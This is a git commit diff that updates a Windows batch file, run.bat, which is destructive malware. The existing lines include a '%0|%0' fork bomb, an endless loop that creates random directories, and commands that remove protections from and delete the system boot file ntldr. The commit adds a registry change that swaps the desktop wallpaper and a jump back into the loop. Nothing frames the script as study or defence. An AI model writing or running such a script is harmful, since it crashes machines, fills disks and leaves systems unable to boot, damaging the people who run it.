0063065e27c80d684cbdcf78f0108f639f5c7b64
ilovecodeing123456799 <90834028+ilovecodeing123456799@users.noreply.github.com>
2022-11-19 16:02:23 +0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,8 +1,13 @@
 %0|%0
 @echo off
 start message.vbs
+reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d  %userprofile%\desktop\t.jpg /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+pause
+exit
 :Rookie
 MD %RANDOM%
 goto Rookie
 attrib -s -r -h c:\ntldr
 del ntldr
+goto Rookie
